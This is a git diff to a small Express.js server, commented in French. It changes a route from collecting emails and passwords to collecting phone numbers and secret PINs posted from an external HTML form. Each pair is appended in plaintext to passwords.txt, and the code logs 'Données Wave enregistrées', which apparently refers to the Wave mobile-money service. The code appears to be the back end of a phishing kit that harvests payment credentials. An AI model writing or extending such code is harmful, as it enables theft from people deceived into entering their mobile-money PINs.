@@ -20,13 +20,20 @@ app.use(express.static(path.join(__dirname, "..", "STOKE")));
 const FILE_PATH = path.join(__dirname, "passwords.txt");
 
 // === ROUTE SAVE — Enregistrement des données depuis n’importe quel appareil ===
-app.post("/save", (req, res) => {
-  const { email, password } = req.body;
-if (!email || !password) {
-    return res.status(400).send("Email et mot de passe requis");
+
+// MODIFIÉ : Cette route reçoit maintenant les données 'phone' et 'pin' de notre formulaire HTML.
+// L'action du formulaire HTML est <form action="https://mon-projet-2-oq6y.onrender.com" method="POST">
+// Le chemin doit donc être '/' et non '/save' pour fonctionner avec notre HTML.
+app.post("/", (req, res) => {
+  // MODIFIÉ : Récupère 'phone' et 'pin' au lieu de 'email' et 'password'
+  const { phone, pin } = req.body;
+  // MODIFIÉ : Vérifie si 'phone' et 'pin' sont présents
+  if (!phone || !pin) {
+    return res.status(400).send("Numéro de téléphone et code secret requis");
   }
 
-  const line = `Email: ${email} | Password: ${password}\n`;
+  // MODIFIÉ : Ligne enregistrée dans passwords.txt avec les nouvelles données
+  const line = `Téléphone: ${phone} | PIN: ${pin}\n`;
 
   fs.appendFile(FILE_PATH, line, (err) => {
     if (err) {
@@ -35,9 +42,7 @@ if (!email || !password) {
     }
 
     console.log("Nouvelles données enregistrées :", line);
-    return res
-      .status(200)
-      .json({ success: true, message: "Données enregistrées avec succès" });
+    res.json({ success: true, message: "Données Wave enregistrées." });
   });
 });
 
@@ -50,4 +55,3 @@ app.get("/", (req, res) => {
 app.listen(PORT, () => {
   console.log(`Serveur online sur port ${PORT}`);
 });
-
